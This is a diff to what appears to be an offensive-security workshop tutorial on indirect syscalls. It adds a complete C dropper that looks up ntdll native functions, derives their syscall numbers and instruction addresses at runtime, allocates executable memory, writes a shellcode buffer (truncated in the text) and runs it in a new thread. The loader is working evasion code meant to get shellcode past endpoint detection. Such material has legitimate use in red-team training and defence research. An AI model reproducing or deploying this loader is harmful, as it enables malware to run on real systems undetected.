@@ -104,6 +104,87 @@ DWORD wNtWaitForSingleObject;
 </details>
 
 
+The full main code of the indirect syscall dropper which retrieves the SSNs dynamically looks like this, and is already implemented in the poc from this chapter and can be downloaded. Again, we use the same native APIs to allocate memory, write memory, create a new thread and wait for exit.
+
+<details>
+<summary>Code</summary>
+    
+```C
+#include <windows.h>  
+#include <stdio.h>    
+#include "syscalls.h"
+
+// Declare global variables to hold the syscall instruction addresses
+UINT_PTR sysAddrNtAllocateVirtualMemory;
+UINT_PTR sysAddrNtWriteVirtualMemory;
+UINT_PTR sysAddrNtCreateThreadEx;
+UINT_PTR sysAddrNtWaitForSingleObject;
+  
+DWORD wNtAllocateVirtualMemory;  // Will hold the syscall number for NtAllocateVirtualMemory
+DWORD wNtWriteVirtualMemory;  // Will hold the syscall number for NtWriteVirtualMemory
+DWORD wNtCreateThreadEx;  // Will hold the syscall number for NtCreateThreadEx
+DWORD wNtWaitForSingleObject;  // Will hold the syscall number for NtWaitForSingleObject
+ 
+
+
+int main() {
+    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
+    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)
+
+    // Get a handle to the ntdll.dll library
+    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
+
+    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
+    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
+    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+
+
+    // The syscall stub (actual system call instruction) is some bytes further into the function. 
+    // In this case, it's assumed to be 0x12 (18 in decimal) bytes from the start of the function.
+    // So we add 0x12 to the function's address to get the address of the system call instruction.
+    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
+    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
+    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
+    sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
+  
+  
+    // Here we're retrieving the system call number for each function. The syscall number is used to identify the syscall when the program uses the syscall instruction.
+    // It's assumed that the syscall number is located 4 bytes into the function.
+    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
+    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
+    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
+    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];
+
+
+    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
+    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+
+    // Define the shellcode to be injected
+    unsigned char shellcode[] = "\xfc\x48\x83...";
+
+    ULONG bytesWritten;
+    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
+    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);
+
+    HANDLE hThread;
+    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
+
+    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+
+    // Return 0 to indicate successful execution of the program.
+    return 0;
+}
+```
+    
+</details>
+
+
+
+
 
 ### Header File
 Like the indirect syscall dropper with hardcodes SSNs, we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall poc folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include the header ``syscalls.h`` in the main code. This taks is redundant if you have already implemented the ``syscalls.h`` in your indirect syscall dropper from before (hardcoded SSNs).
